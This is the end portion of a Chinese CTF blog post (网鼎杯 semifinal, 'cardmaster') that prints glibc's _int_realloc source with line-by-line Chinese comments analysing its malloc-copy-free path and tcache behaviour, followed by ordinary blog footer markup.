+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_int_realloc (mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">         INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr        newp;            /* chunk to return */</span><br><span class="line">  INTERNAL_SIZE_T  newsize;         /* its size */</span><br><span class="line">  void*          newmem;          /* corresponding user mem */</span><br><span class="line"></span><br><span class="line">  mchunkptr        next;            /* next contiguous chunk after oldp */</span><br><span class="line"></span><br><span class="line">  mchunkptr        remainder;       /* extra space at end of newp */</span><br><span class="line">  unsigned long    remainder_size;  /* its size */</span><br><span class="line"></span><br><span class="line">  /* oldmem size */</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (oldp) &lt;= CHUNK_HDR_SZ, 0)  //检查oldp的大小是否小于等于chunk头大小 如果小于等于 那么oldp明显不正常</span><br><span class="line">      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, 0))  //检查oldsize是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid old size&quot;);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, oldp);  //检查oldp指向的内存块是否处于使用中</span><br><span class="line"></span><br><span class="line">  /* All callers already filter out mmap&#x27;ed chunks.  */</span><br><span class="line">  assert (!chunk_is_mmapped (oldp));   //前面已经处理干净了mmap分配的内存块 这里检查一下</span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset (oldp, oldsize);  //获取下一个内存块</span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize (next);  //获取下一个内存块的大小</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (next) &lt;= CHUNK_HDR_SZ, 0)  //检查下一个内存块的大小是否小于等于chunk头大小</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))  //检查下一个内存块的大小是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid next size&quot;);</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (oldsize) &gt;= (unsigned long) (nb))  //检查oldsize是否大于等于nb</span><br><span class="line">    &#123;</span><br><span class="line">      /* already big enough; split below */</span><br><span class="line">      newp = oldp;       //如果oldsize大于重分配的size 就不重新申请chunk 而是切割oldp</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try to expand forward into top */</span><br><span class="line">      if (next == av-&gt;top &amp;&amp;    //如果下一个chunk是top chunk 就扩展oldp</span><br><span class="line">          (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">          (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">          check_inuse_chunk (av, oldp);</span><br><span class="line">          return tag_new_usable (chunk2mem (oldp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* Try to expand forward into next chunk;  split off remainder below */</span><br><span class="line">      else if (next != av-&gt;top &amp;&amp;   //如果下一个chunk(free状态)的大小和oldpsize加起来大于等于nb 就合并oldp和nextchunk 然后重分配</span><br><span class="line">               !inuse (next) &amp;&amp;</span><br><span class="line">               (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">               (unsigned long) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          newp = oldp;</span><br><span class="line">          unlink_chunk (av, next);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* allocate, copy, free */</span><br><span class="line">      else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If possible, free extra space in old or extended chunk */</span><br><span class="line"></span><br><span class="line">  assert ((unsigned long) (newsize) &gt;= (unsigned long) (nb));  //判断重分配后的chunk大小是否大于需要分配的大小 即检测是否有多余的空间</span><br><span class="line"></span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">  if (remainder_size &lt; MINSIZE)   /* not enough extra to split off */</span><br><span class="line">    &#123;   //如果剩余的空间小于最小的chunk大小 那么就设置一些chunk的基础信息然后返回</span><br><span class="line">      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">  else   /* split remainder */</span><br><span class="line">    &#123;  //相反 如果有多余的空间 就切割出来为新的chunk</span><br><span class="line">      remainder = chunk_at_offset (newp, nb);</span><br><span class="line">      /* Clear any user-space tags before writing the header.  */</span><br><span class="line">      remainder = tag_region (remainder, remainder_size);</span><br><span class="line">      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      /* Mark remainder as inuse so free() won&#x27;t complain */</span><br><span class="line">      set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">      _int_free (av, remainder, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, newp);</span><br><span class="line">  return tag_new_usable (chunk2mem (newp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>int_realloc的主要逻辑都是通过下面这个if分支来 这里着重来分析一波</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>开头先调用int_malloc(注意 这里是int_malloc 正如realloc一样 malloc也有int和libc两种形式 一般我们通过程序调用的是libc_malloc 所以就会出现 之前发现的明明tcachebin中有合适的chunk 但是却不会申请到了 具体是哪里的分支绕走了 又如何解决 还需要接着往下分析)<br>接下来进行了一个check 检测new_chunk就是next_chunk 但是在此之前 已经单独对next_chunk是否可以用来扩展old_chunk做了判断 这里的if是为了避免int_malloc后 next_chunk变得可用了 而做的异常处理 不过这是为了防止啥样的特殊情况 我也想象不出来 希望在阅读int_malloc后能够得到结论<br>然后就是标准的copy-free了 由于free在实验过程中没有出现特别显著的问题 所以就先不看int_free的源码了 来看看int_malloc和libc_malloc有什么不同</p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cardmaster"><span class="toc-number">1.</span> <span class="toc-text">cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6wp"><span class="toc-number">1.1.</span> <span class="toc-text">赛时wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-realloc%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">后记 realloc详解</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&text=网鼎杯半决赛"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&is_video=false&description=网鼎杯半决赛"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯半决赛&body=Check out this article: http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&name=网鼎杯半决赛&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&t=网鼎杯半决赛"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
